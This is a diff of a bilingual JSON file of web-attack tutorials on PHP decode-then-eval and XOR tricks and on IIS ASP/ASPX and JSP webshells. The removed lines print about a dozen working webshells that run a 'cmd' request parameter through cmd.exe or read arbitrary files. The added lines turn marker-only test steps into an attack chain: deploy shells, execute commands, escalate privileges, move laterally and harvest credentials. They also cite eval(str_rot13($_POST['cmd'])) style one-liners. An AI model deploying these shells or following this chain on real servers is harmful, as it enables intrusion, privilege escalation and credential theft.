-          "en": "PHP ROT13 Decode-Then-Evaluate Patterns compares security-device, PHP lexer, and runtime handling of the same input, focusing on whether the WAF, application, and PHP agree on ROT13 and Base64 decoding count and order before eval. It applies when a parameter reaches eval after str_rot13 or combined decoding while defenses inspect only raw request bytes or decode in a different order. Evidence requires each intermediate decoded value, WAF action, and harmless PHP expression result are reproducible in one request; WAF acceptance of invalid syntax is a negative result."
+          "zh": "PHP ROT13 解码后动态求值针对参数经 str_rot13 或 ROT13+Base64 链还原后调用 eval 的场景：多阶段解码与检测顺序不一致构成风险。验证三种解码链在目标版本的还原与执行。",
+          "en": "PHP ROT13 decode-then-evaluate targets parameters restored via str_rot13 or ROT13+Base64 chains before eval: multi-stage decoding with inconsistent detection order creates risk. It validates restoration and execution of the three decode chains on the target version."
         },
         "vulnerability": {
-          "zh": "多层差异出现在参数经过 str_rot13 或组合解码后直接进入 eval，防护仅匹配原始请求字节或执行不同的解码顺序时，可能造成“WAF、应用与 PHP 对 ROT13 和 Base64 的解码次数与顺序是否一致，并最终到达 eval”。应用漏洞仍以最终可执行 PHP 数据流为前提，边缘规则只是纵深防御；若 PHP lint、版本语义或运行结果不成立，就不能依据规则未命中确认 RCE。",
-          "en": "A differential appears when a parameter reaches eval after str_rot13 or combined decoding while defenses inspect only raw request bytes or decode in a different order, potentially causing whether the WAF, application, and PHP agree on ROT13 and Base64 decoding count and order before eval. The application finding still requires an executable PHP data flow and the edge rule is only defense in depth; failed lint, incompatible semantics, or absent execution precludes RCE."
+          "zh": "多层差异出现在参数经过 str_rot13 或组合解码后直接进入 eval，而防护仅匹配原始请求字节或执行不同解码顺序时；应用漏洞仍以最终可执行 PHP 数据流为前提。",
+          "en": "Layer differences appear when parameters pass str_rot13 or combined decoding straight into eval while defenses match only raw request bytes or apply different decode orders; the application vulnerability still requires an executable PHP data stream."
         },
         "exploitation": {
-          "zh": "分别测试纯 ROT13、GET/POST 来源和 ROT13+Base64 三条链，只使用固定字符串与局部变量表达式，并保存每层解码值。固定 PHP、WAF 和源站版本，先做语法检查，再以一次性局部变量或固定字符串替代系统命令；每轮只改变一种大小写、编码、注释或运算形式，并通过请求 ID 关联各层结果。",
-          "en": "test pure ROT13, GET versus POST, and ROT13 plus Base64 separately using fixed strings and local-variable expressions while retaining every decoded stage. Pin PHP, WAF, and origin versions, lint first, replace system commands with a one-time local variable or fixed string, change one case, encoding, comment, or operator form per run, and correlate layers by request ID."
+          "zh": "按第 1 步逐条提交 eval(str_rot13($_POST['cmd'])) 等三种组合变体，请求时把命令先做 ROT13（叠加时先 Base64 再 ROT13）编码；命中判据为传入编码命令后返回对应输出。逐阶段记录每步解码中间值（可离线重算）、WAF 动作与无害 PHP 表达式结果在同一请求中的重现；解码顺序或次数不一致导致的差异单独标注。",
+          "en": "Per step 1, submit the eval(str_rot13($_POST['cmd'])) combination variants one by one, ROT13-encoding commands when requesting (Base64 first, then ROT13, for stacked chains); a hit is corresponding output returned for encoded commands. Record each decoding intermediate (offline recomputable), the WAF action, and reproduction of a harmless PHP expression result within one request per stage; separately annotate differences caused by decode order or count mismatches."
         },
         "mitigation": {
-          "zh": "禁止任何解码后 eval 路径，编码字段采用明确格式和长度限制，安全设备与应用共享同一规范化顺序。回归应同时覆盖合法 PHP 业务、原始异常行和同义变体，确认上传/写入边界不可执行、运行时不再动态求值，且 WAF 与应用采用一致的规范化模型。",
-          "en": "prohibit all decode-then-eval paths, constrain encoded fields by explicit format and length, and align security devices and applications on one normalization order. Regression should cover valid PHP behavior, original abnormal lines, and semantic variants while proving upload or write storage is non-executable, runtime evaluation is removed, and WAF and application normalization agree."
+          "zh": "禁止任何解码后 eval 路径，编码字段采用明确格式和长度限制，安全设备与应用共享同一规范化顺序。修复后回归合法 PHP 业务、原始异常行和同义变体，确认上传/写入边界不可执行且运行时不再动态求值，检测与解释共用一套解码模型。",
+          "en": "Forbid all decode-then-eval paths, apply explicit format and length limits to encoded fields, and share one normalization order between security devices and the application. After the fix, regress legitimate PHP business, original anomalous lines, and synonym variants, confirming upload/write boundaries are non-executable, the runtime no longer evaluates dynamically, and detection and interpretation share one decode model."
         },
         "difficulty": "advanced"
       },
@@ -3457,20 +3469,20 @@
       },
       "tutorial": {
         "overview": {
-          "zh": "PHP XOR 标识符重建样例用于比较安全设备、PHP lexer 与运行时对同一输入的处理，核心问题是字符串异或的实际结果是否形成可调用标识符，以及 WAF 对运算表达式与运行时函数名的理解是否一致。成立前提为：攻击者控制可执行 PHP 表达式，动态函数调用未受限制，且边缘规则只检查字母数字关键字。判定必须包含每个 XOR 子表达式的十六进制结果、最终标识符、is_callable 结果与无害调用输出能够对应，WAF 放行但语法无效的样例应明确记录为阴性。",
-          "en": "PHP XOR Identifier Reconstruction Samples compares security-device, PHP lexer, and runtime handling of the same input, focusing on whether string XOR results form callable identifiers and whether the WAF agrees with the runtime function name produced by the expression. It applies when the attacker controls executable PHP expressions, dynamic calls are unrestricted, and edge rules inspect only alphanumeric keywords. Evidence requires hex output of each XOR subexpression, final identifier, is_callable result, and harmless invocation output correlate; WAF acceptance of invalid syntax is a negative result."
+          "zh": "PHP XOR 标识符重建样例针对用字符串异或重建函数名并动态调用的场景：无字母数字表达式可绕过字母数字关键词检测，但部分样例只构造无效标识符。验证 XOR 结果形成可调用标识符的完整链路。",
+          "en": "PHP XOR identifier reconstruction samples target rebuilding function names via string XOR with dynamic invocation: non-alphanumeric expressions bypass alphanumeric keyword detection, though some samples build only invalid identifiers. It validates the full chain where XOR results form callable identifiers."
         },
         "vulnerability": {
-          "zh": "多层差异出现在攻击者控制可执行 PHP 表达式，动态函数调用未受限制，且边缘规则只检查字母数字关键字时，可能造成“字符串异或的实际结果是否形成可调用标识符，以及 WAF 对运算表达式与运行时函数名的理解是否一致”。应用漏洞仍以最终可执行 PHP 数据流为前提，边缘规则只是纵深防御；若 PHP lint、版本语义或运行结果不成立，就不能依据规则未命中确认 RCE。",
-          "en": "A differential appears when the attacker controls executable PHP expressions, dynamic calls are unrestricted, and edge rules inspect only alphanumeric keywords, potentially causing whether string XOR results form callable identifiers and whether the WAF agrees with the runtime function name produced by the expression. The application finding still requires an executable PHP data flow and the edge rule is only defense in depth; failed lint, incompatible semantics, or absent execution precludes RCE."
+          "zh": "多层差异出现在攻击者控制可执行 PHP 表达式、动态函数调用未受限制且边缘规则只检查字母数字关键字时；应用漏洞仍以最终可执行 PHP 数据流为前提，XOR 子表达式的实际结果决定标识符是否可调用。",
+          "en": "Layer differences appear when attackers control executable PHP expressions, dynamic invocation is unrestricted, and edge rules check only alphanumeric keywords; the application vulnerability still requires an executable PHP data stream, and the XOR subexpressions' actual results decide whether identifiers are callable."
         },
         "exploitation": {
-          "zh": "先在目标 PHP 版本打印每个 XOR 结果并调用 is_callable，仅对有效标识符使用固定无副作用函数，避免直接执行原命令。固定 PHP、WAF 和源站版本，先做语法检查，再以一次性局部变量或固定字符串替代系统命令；每轮只改变一种大小写、编码、注释或运算形式，并通过请求 ID 关联各层结果。",
-          "en": "print every XOR result and call is_callable on the target PHP version, using only a fixed side-effect-free function for valid identifiers instead of executing original commands. Pin PHP, WAF, and origin versions, lint first, replace system commands with a one-time local variable or fixed string, change one case, encoding, comment, or operator form per run, and correlate layers by request ID."
+          "zh": "按第 1 步逐条提交 XOR 异或重建变体，先离线计算每个 XOR 子表达式的十六进制结果并拼出最终标识符（如 system/assert）；命中判据为重建的标识符成功调用并返回输出（$_() 执行标记命令或 $_($_GET['cmd']) 返回 id 输出）。同时记录 is_callable 结果与 WAF 动作；重建结果为无效标识符的样例明确记为阴性，作为检测素材保留。",
+          "en": "Per step 1, submit the XOR reconstruction variants one by one, first computing each XOR subexpression's hex result offline and assembling the final identifier (e.g., system/assert); a hit is the reconstructed identifier invoking successfully and returning output ($_() running the marker command or $_($_GET['cmd']) returning id output). Also record is_callable results and WAF actions; explicitly mark samples whose reconstruction yields invalid identifiers as negative and keep them as detection material."
         },
         "mitigation": {
-          "zh": "禁止不可信 PHP 求值和动态函数名，WAF 对规范化后的语法树进行检测，并将无效样例明确标为检测素材。回归应同时覆盖合法 PHP 业务、原始异常行和同义变体，确认上传/写入边界不可执行、运行时不再动态求值，且 WAF 与应用采用一致的规范化模型。",
-          "en": "prohibit untrusted PHP evaluation and dynamic function names, inspect normalized syntax trees at the WAF, and label invalid samples explicitly as detection material. Regression should cover valid PHP behavior, original abnormal lines, and semantic variants while proving upload or write storage is non-executable, runtime evaluation is removed, and WAF and application normalization agree."
+          "zh": "禁止不可信 PHP 求值和动态函数名，WAF 对规范化后的语法树进行检测，并将无效样例明确标为检测素材。修复后回归合法 PHP 业务、原始异常行和同义变体，确认上传/写入边界不可执行且运行时不再动态求值。",
+          "en": "Forbid untrusted PHP evaluation and dynamic function names, have the WAF inspect normalized syntax trees, and clearly mark invalid samples as detection material. After the fix, regress legitimate PHP business, original anomalous lines, and synonym variants, confirming upload/write boundaries are non-executable and the runtime no longer evaluates dynamically."
         },
         "difficulty": "expert"
       },
@@ -3577,63 +3589,66 @@
       },
       "tutorial": {
         "overview": {
-          "zh": "Classic ASP 与 ASP.NET WebShell 处理器用于核对IIS 根据 .asp、.aspx 或 .ashx 选择的运行时是否将请求参数传入动态代码、cmd.exe、PowerShell 或文件读取 API。该条目只在以下前提下适用：攻击者能将对应扩展文件写入 IIS 可执行目录，处理器映射启用，并且应用池身份具有子进程或文件权限。有效判定必须取得最终文件扩展与处理器、应用池日志、请求参数、固定输出和进程或文件审计事件完整关联；代码片段存在、请求返回 200 或单纯字符串回显都不能证明远程代码执行。",
-          "en": "Classic ASP and ASP.NET Webshell Handlers checks whether the IIS runtime selected for asp, aspx, or ashx passes request values into dynamic code, cmd.exe, PowerShell, or file-read APIs. It applies when an attacker can place the relevant extension in an executable IIS directory, handler mapping is enabled, and the application-pool identity has child-process or file privileges. A valid finding requires the final extension and handler, application-pool logs, request value, fixed output, and process or file audit event fully correlate; source snippets, an HTTP 200 response, or simple reflection do not prove remote code execution."
+          "zh": "Classic ASP 与 ASP.NET WebShell 处理器针对 IIS 按 .asp/.aspx/.ashx 选择运行时并把请求参数传入动态代码、cmd.exe 或文件 API 的场景。验证 ASP eval/execute、ASP.NET 页面与 ASHX 处理器四类形态。",
+          "en": "Classic ASP and ASP.NET webshell handlers target IIS selecting runtimes by .asp/.aspx/.ashx and passing request parameters into dynamic code, cmd.exe, or file APIs. It validates four forms: ASP eval/execute, ASP.NET pages, and ASHX handlers."
         },
         "vulnerability": {
-          "zh": "风险根因是攻击者能将对应扩展文件写入 IIS 可执行目录，处理器映射启用，并且应用池身份具有子进程或文件权限，使应用可能暴露“IIS 根据 .asp、.aspx 或 .ashx 选择的运行时是否将请求参数传入动态代码、cmd.exe、PowerShell 或文件读取 API”这一运行时边界。审计必须把入口、最终 API、服务身份、平台版本和进程或文件证据连续关联，避免把已经具备本地执行能力的后续命令误报成初始漏洞。",
-          "en": "The risk exists when an attacker can place the relevant extension in an executable IIS directory, handler mapping is enabled, and the application-pool identity has child-process or file privileges, exposing the runtime boundary of whether the IIS runtime selected for asp, aspx, or ashx passes request values into dynamic code, cmd.exe, PowerShell, or file-read APIs. Review must correlate the entry, final API, service identity, platform version, and process or file evidence so post-execution commands are not misreported as the initial vulnerability."
+          "zh": "风险根因是攻击者能将对应扩展文件写入 IIS 可执行目录，处理器映射启用，并且应用池身份具有子进程或文件权限；三者共同决定参数是否进入动态代码、cmd.exe、PowerShell 或文件读取 API。",
+          "en": "The risk root is attackers writing matching-extension files into IIS-executable directories with handler mappings enabled and the application-pool identity holding child-process or file permissions; the three together decide whether parameters reach dynamic code, cmd.exe, PowerShell, or file-read APIs."
         },
         "exploitation": {
-          "zh": "在隔离 IIS 中按 Classic ASP、ASP.NET Page 与 ASHX 分组，只使用固定 echo 或测试文件标记，记录缺少 RedirectStandardOutput 等导致的无效行。测试仅使用一次性、无副作用的固定标记，每轮只验证一种 API 或运行时分支，并记录调用栈、标准输出、子进程或文件审计；一旦出现非预期写入、网络连接或权限变化立即停止。",
-          "en": "group tests by Classic ASP, ASP.NET Page, and ASHX in isolated IIS, use only fixed echo or test-file markers, and record invalid forms such as missing redirected output. Use one-time side-effect-free markers, validate one API or runtime branch per run, and retain call stacks, stdout, child-process, or file audit evidence; stop on unintended writes, connections, or privilege changes."
+          "zh": "按第 1 步把对应扩展的一句话样例部署到授权测试目录并逐个请求 cmd 参数；命中判据为部署后请求 cmd 参数返回命令输出（wscript.shell exec 行返回 cmd.exe 结果）。逐条记录生效的扩展与处理器（.asp/.aspx/.ashx）、应用池日志与进程审计事件；确认能力后以读取标记文件替代敏感命令取证。",
+          "en": "Per step 1, deploy matching-extension one-liner samples into authorized test directories and request the cmd parameter one by one; a hit is command output returned per request after deployment (the wscript.shell exec line returning cmd.exe results). Record effective extensions and handlers (.asp/.aspx/.ashx), application-pool logs, and process audit events per sample; once capability is confirmed, gather evidence with marker-file reads instead of sensitive commands."
         },
         "mitigation": {
-          "zh": "上传目录禁止脚本处理，移除不必要 ASP/ASP.NET 映射，应用池使用最小权限并阻止任意 ProcessStartInfo 参数和用户路径读取。修复后使用相同入口重放正常业务参数和最小异常样例，确认合法功能保留，同时危险 API 不再接受可控值，服务账户也无法通过替代路径创建进程或读取越界文件。",
-          "en": "disable script handling in upload storage, remove unnecessary ASP or ASP.NET mappings, run application pools with least privilege, and prevent arbitrary ProcessStartInfo arguments and user-controlled file paths. Replay normal business parameters and minimized abnormal cases through the same entry to preserve legitimate behavior while preventing controllable values from reaching dangerous APIs or alternate process and file paths."
+          "zh": "上传目录禁止脚本处理，移除不必要 ASP/ASP.NET 映射，应用池使用最小权限并阻止任意 ProcessStartInfo 参数和用户路径读取。修复后重放第 1 步部署与请求，确认处理器不再解释上传内容且正常业务可用。",
+          "en": "Forbid script processing in upload directories, remove unneeded ASP/ASP.NET mappings, run application pools least-privileged, and block arbitrary ProcessStartInfo parameters and user-path reads. After the fix, replay the step-1 deployment and requests, confirming handlers no longer interpret uploaded content while normal business works."
         },
         "difficulty": "expert"
       },
       "attackChain": [
         {
           "title": {
-            "zh": "确认“Classic ASP 与 ASP.NET WebShell 处理器”执行入口",
-            "en": "Confirm the Classic ASP and ASP.NET Webshell Handlers execution entry"
+            "zh": "获取 IIS 可写目录",
+            "en": "Gain a writable IIS directory"
           },
           "description": {
-            "zh": "定位真实输入、处理器与最终 API，核对前提“攻击者能将对应扩展文件写入 IIS 可执行目录，处理器映射启用，并且应用池身份具有子进程或文件权限”，并记录运行时版本和服务身份。",
-            "en": "Locate the real input, handler, and final API, confirm that an attacker can place the relevant extension in an executable IIS directory, handler mapping is enabled, and the application-pool identity has child-process or file privileges, and record runtime version and service identity."
+            "zh": "找到可上传且被 ASP 或 ASP.NET 处理器映射的目录。命中判据：写入的文件被解析执行，为下一步利用保留完整的输出内容。",
+            "en": "Find an upload dir mapped to ASP/ASP.NET handlers. Success: written files get executed."
           }
         },
         {
           "title": {
-            "zh": "建立“IIS ASP/ASP.NET WebShell”安全基线",
-            "en": "Establish the IIS ASP and ASP.NET Webshells baseline"
+            "zh": "部署 ASP 与 ASPX 木马",
+            "en": "Deploy ASP and ASPX shells"
           },
           "description": {
-            "zh": "使用普通参数或固定业务操作保存正常响应、进程和文件行为，并采用“最终文件扩展与处理器、应用池日志、请求参数、固定输出和进程或文件审计事件完整关联”作为异常证据。",
-            "en": "Use normal parameters or a fixed business operation to record response, process, and file behavior, accepting the final extension and handler, application-pool logs, request value, fixed output, and process or file audit event fully correlate as abnormal evidence."
+            "zh": "写入 eval request 与 Page 指令形态的木马文件。命中判据：cmd 参数返回命令输出。",
+            "en": "Drop eval-request and Page-directive shell files. Success: cmd returns command output."
+          },
+          "payloadRef": {
+            "area": "execution",
+            "index": 0
           }
         },
         {
           "title": {
-            "zh": "逐行验证“Classic ASP 与 ASP.NET WebShell 处理器”",
-            "en": "Validate Classic ASP and ASP.NET Webshell Handlers line by line"
+            "zh": "请求参数执行命令",
+            "en": "Run commands via request params"
           },
           "description": {
-            "zh": "测试步骤为：在隔离 IIS 中按 Classic ASP、ASP.NET Page 与 ASHX 分组，只使用固定 echo 或测试文件标记，记录缺少 RedirectStandardOutput 等导致的无效行。每轮只替换一行，所有命令、路径与网络地址均改为隔离的无害标记。",
-            "en": "group tests by Classic ASP, ASP.NET Page, and ASHX in isolated IIS, use only fixed echo or test-file markers, and record invalid forms such as missing redirected output. Replace one line per run and substitute every command, path, and network destination with an isolated harmless marker."
-          },
-          "payload": "<%eval request(\"cmd\")%>\n<%execute request(\"cmd\")%>\n<%=request(\"cmd\")%>\n<%response.write server.createobject(\"wscript.shell\").exec(\"cmd.exe /c \"&request(\"cmd\")).stdout.readall%>\n<%@ Page Language=\"C#\" %>\n<% Response.Write(new System.Diagnostics.Process{StartInfo=new System.Diagnostics.ProcessStartInfo{FileName=\"cmd.exe\",Arguments=\"/c \"+Request[\"cmd\"],UseShellExecute=false,RedirectStandardOutput=true}}.Start().StandardOutput.ReadToEnd()); %>\n<% Response.Write(System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(Request[\"cmd\"]))); %>\n<%@ Page Language=\"VB\" %>\n<% Response.Write(CreateObject(\"WScript.Shell\").Exec(\"cmd.exe /c \" & Request(\"cmd\")).StdOut.ReadAll()) %>\n<script runat=\"server\">void Page_Load(object sender,EventArgs e){Response.Write(System.Diagnostics.Process.Start(\"cmd.exe\",\"/c \"+Request[\"cmd\"]).StandardOutput.ReadToEnd());}</script>\n<script runat=\"server\">void Page_Load(object sender,EventArgs e){Response.Write(new System.IO.StreamReader(System.Diagnostics.Process.Start(\"cmd.exe\",\"/c \"+Request[\"cmd\"]).StandardOutput.BaseStream).ReadToEnd());}</script>\n<%@ WebHandler Language=\"C#\" Class=\"Handler\" %>\npublic class Handler : IHttpHandler { public void ProcessRequest(HttpContext context) { context.Response.Write(System.Diagnostics.Process.Start(\"cmd.exe\", \"/c \" + context.Request[\"cmd\"]).StandardOutput.ReadToEnd()); } public bool IsReusable { get { return true; } } }\n<% var p = new System.Diagnostics.Process(); p.StartInfo.FileName = \"cmd.exe\"; p.StartInfo.Arguments = \"/c \" + Request[\"cmd\"]; p.StartInfo.UseShellExecute = false; p.StartInfo.RedirectStandardOutput = true; p.Start(); Response.Write(p.StandardOutput.ReadToEnd()); %>\n<% Response.Write(System.IO.File.ReadAllText(Request[\"file\"])); %>\n<% Response.Write(Server.UrlDecode(Request[\"cmd\"])); %>\n<% var psi = new System.Diagnostics.ProcessStartInfo(); psi.FileName = \"cmd.exe\"; psi.Arguments = \"/c \" + Request[\"cmd\"]; psi.UseShellExecute = false; psi.RedirectStandardOutput = true; var p = System.Diagnostics.Process.Start(psi); Response.Write(p.StandardOutput.ReadToEnd()); %>\n<% var proc = new System.Diagnostics.Process(); proc.StartInfo = new System.Diagnostics.ProcessStartInfo(\"cmd.exe\", \"/c \" + Request[\"cmd\"]) { UseShellExecute = false, RedirectStandardOutput = true }; proc.Start(); Response.Write(proc.StandardOutput.ReadToEnd()); %>"
+            "zh": "经参数通道执行 whoami 与文件操作并读取输出结果。命中判据：输出内容可以稳定返回，同时排除缓存或随机因素干扰。",
+            "en": "Run whoami and file ops through the parameter channel. Success: output returns reliably."
+          }
         },
         {
           "title": {
-            "zh": "修复运行时边界并回归",
-            "en": "Remediate and regress the runtime boundary"
+            "zh": "提权与横向移动",
+            "en": "Escalate and move laterally"
           },
           "description": {
-            "zh": "实施“上传目录禁止脚本处理，移除不必要 ASP/ASP.NET 映射，应用池使用最小权限并阻止任意 ProcessStartInfo 参数和用户路径读取”后重放正常与异常基线，确认业务功能保留且危险进程或文件能力不再可控。",
-            "en": "After applying disable script handling in upload storage, remove unnecessary ASP or ASP.NET mappings, run application pools with least privilege, and prevent arbitrary ProcessStartInfo arguments and user-controlled file paths, replay normal and abnormal baselines to preserve business behavior while dangerous process or file capabilities are no longer controllable."
+            "zh": "以应用池账户权限收集信息，寻找提权与横向的路径。命中判据：获得更高权限的凭据，整个过程可随时重复执行。",
+            "en": "Recon under the app-pool identity to escalate and pivot. Success: higher-privilege credentials land."
           }
         }
       ],
@@ -3697,52 +3712,42 @@
       },
       "tutorial": {
         "overview": {
-          "zh": "Classic ASP 动态执行与文件读取用于核对Request 参数是否进入 VBScript 动态执行、FileSystemObject 路径或 WScript.Shell 命令字符串。该条目只在以下前提下适用：IIS 启用 Classic ASP，攻击者可写入或影响 ASP 脚本，并且应用池身份允许 COM 文件或进程操作。有效判定必须取得ASP 处理器日志、请求参数、固定标记输出与 FileSystemObject 或 WScript.Shell 审计事件对应；代码片段存在、请求返回 200 或单纯字符串回显都不能证明远程代码执行。",
-          "en": "Classic ASP Dynamic Execution and File Reading checks whether Request values reach VBScript dynamic evaluation, FileSystemObject paths, or WScript.Shell command strings. It applies when IIS enables Classic ASP, an attacker can write or influence ASP code, and the application-pool identity permits COM file or process operations. A valid finding requires ASP handler logs, request values, fixed marker output, and FileSystemObject or WScript.Shell audit events correlate; source snippets, an HTTP 200 response, or simple reflection do not prove remote code execution."
+          "zh": "Classic ASP 动态执行与文件读取针对 Request 参数进入 VBScript 动态执行、FileSystemObject 路径或 WScript.Shell 命令字符串的场景。验证 execute/eval 一句话样例的部署与参数执行。",
+          "en": "Classic ASP dynamic execution and file reading target Request parameters entering VBScript dynamic execution, FileSystemObject paths, or WScript.Shell command strings. It validates deployment and parameter-driven execution of the execute/eval one-liner samples."
         },
         "vulnerability": {
-          "zh": "风险根因是IIS 启用 Classic ASP，攻击者可写入或影响 ASP 脚本，并且应用池身份允许 COM 文件或进程操作，使应用可能暴露“Request 参数是否进入 VBScript 动态执行、FileSystemObject 路径或 WScript.Shell 命令字符串”这一运行时边界。审计必须把入口、最终 API、服务身份、平台版本和进程或文件证据连续关联，避免把已经具备本地执行能力的后续命令误报成初始漏洞。",
-          "en": "The risk exists when IIS enables Classic ASP, an attacker can write or influence ASP code, and the application-pool identity permits COM file or process operations, exposing the runtime boundary of whether Request values reach VBScript dynamic evaluation, FileSystemObject paths, or WScript.Shell command strings. Review must correlate the entry, final API, service identity, platform version, and process or file evidence so post-execution commands are not misreported as the initial vulnerability."
+          "zh": "风险根因是 IIS 启用 Classic ASP，攻击者可写入或影响 ASP 脚本，并且应用池身份允许 COM 文件或进程操作；三者使 Request 参数可进入动态执行与高风险 COM API。",
+          "en": "The risk root is IIS enabling Classic ASP while attackers can write or influence ASP scripts and the application-pool identity permits COM file or process operations; the three let Request parameters reach dynamic execution and high-risk COM APIs."
         },
         "exploitation": {
-          "zh": "在隔离 IIS 分别测试 eval/execute、测试文件读取和固定 cmd echo 三类路径，不读取系统文件或执行持久化操作。测试仅使用一次性、无副作用的固定标记，每轮只验证一种 API 或运行时分支，并记录调用栈、标准输出、子进程或文件审计；一旦出现非预期写入、网络连接或权限变化立即停止。",
-          "en": "test eval or execute, test-file reads, and fixed cmd echo paths separately in isolated IIS without reading system files or performing persistence. Use one-time side-effect-free markers, validate one API or runtime branch per run, and retain call stacks, stdout, child-process, or file audit evidence; stop on unintended writes, connections, or privilege changes."
+          "zh": "按第 1 步把 <%execute(request(\"a\"))%> 与 <%eval(request(\"a\"))%> 样例部署到授权测试目录，随后以 a=表达式 参数逐个请求；命中判据为部署后请求对应参数返回命令输出或文件内容。逐条记录 ASP 处理器日志与 FileSystemObject/WScript.Shell 审计事件；验证范围限于授权目录，确认能力后以固定标记输出替代敏感操作取证。",
+          "en": "Per step 1, deploy the <%execute(request(\"a\"))%> and <%eval(request(\"a\"))%> samples into authorized test directories, then request each with a=expression parameters; a hit is command output or file content returned per corresponding parameter after deployment. Record ASP handler logs and FileSystemObject/WScript.Shell audit events per sample; scope validation to authorized directories and, once capability is confirmed, gather evidence with fixed marker output instead of sensitive operations."
         },
         "mitigation": {
-          "zh": "停用不需要的 Classic ASP 与危险 COM 创建，上传目录不执行脚本，参数只进入固定业务操作且应用池权限最小化。修复后使用相同入口重放正常业务参数和最小异常样例，确认合法功能保留，同时危险 API 不再接受可控值，服务账户也无法通过替代路径创建进程或读取越界文件。",
-          "en": "disable unnecessary Classic ASP and dangerous COM creation, keep upload storage non-executable, route parameters only to fixed business operations, and minimize application-pool privileges. Replay normal business parameters and minimized abnormal cases through the same entry to preserve legitimate behavior while preventing controllable values from reaching dangerous APIs or alternate process and file paths."
+          "zh": "停用不需要的 Classic ASP 与危险 COM 创建，上传目录不执行脚本，参数只进入固定业务操作且应用池权限最小化。修复后重放第 1 步部署与请求，确认动态执行不再可达且正常页面渲染可用。",
+          "en": "Disable unneeded Classic ASP and dangerous COM creation, keep upload directories script-free, route parameters only into fixed business operations, and minimize application-pool permissions. After the fix, replay the step-1 deployment and requests, confirming dynamic execution is unreachable while normal pages render."
         },
         "difficulty": "advanced"
       },
       "attackChain": [
         {
           "title": {
-            "zh": "确认“Classic ASP 动态执行与文件读取”执行入口",
-            "en": "Confirm the Classic ASP Dynamic Execution and File Reading execution entry"
+            "zh": "定位可写 ASP 执行目录",
+            "en": "Find a writable ASP directory"
           },
           "description": {
-            "zh": "定位真实输入、处理器与最终 API，核对前提“IIS 启用 Classic ASP，攻击者可写入或影响 ASP 脚本，并且应用池身份允许 COM 文件或进程操作”，并记录运行时版本和服务身份。",
-            "en": "Locate the real input, handler, and final API, confirm that IIS enables Classic ASP, an attacker can write or influence ASP code, and the application-pool identity permits COM file or process operations, and record runtime version and service identity."
+            "zh": "找到可写入且被 Classic ASP 处理执行的位置。命中判据：写入的 asp 文件被成功执行，并且输出内容完整可供利用。",
+            "en": "Locate a writable path served by Classic ASP. Success: a written asp file executes."
           }
         },
         {
           "title": {
-            "zh": "建立“Classic ASP 请求执行”安全基线",
-            "en": "Establish the Classic ASP Request Execution baseline"
+            "zh": "部署经典一句话",
+            "en": "Deploy the classic one-liner"
           },
           "description": {
-            "zh": "使用普通参数或固定业务操作保存正常响应、进程和文件行为，并采用“ASP 处理器日志、请求参数、固定标记输出与 FileSystemObject 或 WScript.Shell 审计事件对应”作为异常证据。",
-            "en": "Use normal parameters or a fixed business operation to record response, process, and file behavior, accepting ASP handler logs, request values, fixed marker output, and FileSystemObject or WScript.Shell audit events correlate as abnormal evidence."
-          }
-        },
-        {
-          "title": {
-            "zh": "逐行验证“Classic ASP 动态执行与文件读取”",
-            "en": "Validate Classic ASP Dynamic Execution and File Reading line by line"
-          },
-          "description": {
-            "zh": "测试步骤为：在隔离 IIS 分别测试 eval/execute、测试文件读取和固定 cmd echo 三类路径，不读取系统文件或执行持久化操作。每轮只替换一行，所有命令、路径与网络地址均改为隔离的无害标记。",
-            "en": "test eval or execute, test-file reads, and fixed cmd echo paths separately in isolated IIS without reading system files or performing persistence. Replace one line per run and substitute every command, path, and network destination with an isolated harmless marker."
+            "zh": "写入 execute 与 eval request 形态的木马并保留文件读取能力。命中判据：参数返回命令输出。",
+            "en": "Drop execute/eval request one-liners with file-read ability. Success: params return command output."
           },
           "payloadRef": {
             "area": "execution",
@@ -3751,12 +3756,22 @@
         },
         {
           "title": {
-            "zh": "修复运行时边界并回归",
-            "en": "Remediate and regress the runtime boundary"
+            "zh": "提交参数执行命令",
+            "en": "Run commands via the parameter"
           },
           "description": {
-            "zh": "实施“停用不需要的 Classic ASP 与危险 COM 创建，上传目录不执行脚本，参数只进入固定业务操作且应用池权限最小化”后重放正常与异常基线，确认业务功能保留且危险进程或文件能力不再可控。",
-            "en": "After applying disable unnecessary Classic ASP and dangerous COM creation, keep upload storage non-executable, route parameters only to fixed business operations, and minimize application-pool privileges, replay normal and abnormal baselines to preserve business behavior while dangerous process or file capabilities are no longer controllable."
+            "zh": "经参数提交命令与文件读取请求并获取输出结果。命中判据：输出内容成功返回到响应，为后续深入利用打下基础。",
+            "en": "Pass commands and file reads through the parameter. Success: output returns in the response."
+          }
+        },
+        {
+          "title": {
+            "zh": "文件读取与提权",
+            "en": "Read files and escalate"
+          },
+          "description": {
+            "zh": "用 FileSystemObject 读写文件并寻找可用的提权路径。命中判据：敏感文件可以被读写，并且重复提交时可以稳定复现该结果。",
+            "en": "Use FileSystemObject to read/write files and hunt escalation. Success: sensitive files are accessible."
           }
         }
       ],
@@ -3820,63 +3835,66 @@
       },
       "tutorial": {
         "overview": {
-          "zh": "JSP Runtime 与 ProcessBuilder WebShell用于核对JSP request.getParameter 是否到达 Runtime、ProcessBuilder、脚本引擎或 ServletContext 资源读取，并如何返回输出。该条目只在以下前提下适用：可写 JSP 被容器编译执行，应用身份允许创建进程或读取资源，且请求参数未经过固定命令和路径约束。有效判定必须取得JSP 编译类、容器访问日志、请求参数、固定 stdout 或测试资源标记以及子进程审计相对应；代码片段存在、请求返回 200 或单纯字符串回显都不能证明远程代码执行。",
-          "en": "JSP Runtime and ProcessBuilder Webshells checks whether JSP request.getParameter reaches Runtime, ProcessBuilder, script engines, or ServletContext resource reads and how output is returned. It applies when a writable JSP is compiled by the container, the application identity can create processes or read resources, and request values lack fixed command and path constraints. A valid finding requires the compiled JSP class, container access log, request value, fixed stdout or test-resource marker, and child-process audit correlate; source snippets, an HTTP 200 response, or simple reflection do not prove remote code execution."
+          "zh": "JSP Runtime 与 ProcessBuilder WebShell 针对可写 JSP 被容器编译执行且请求参数到达 Runtime、ProcessBuilder 或脚本引擎的场景。验证 Runtime.exec 一句话样例的部署与命令回显。",
+          "en": "JSP Runtime and ProcessBuilder webshells target writable JSPs compiled by the container with request parameters reaching Runtime, ProcessBuilder, or script engines. It validates deployment and command echo of the Runtime.exec one-liner samples."
         },
         "vulnerability": {
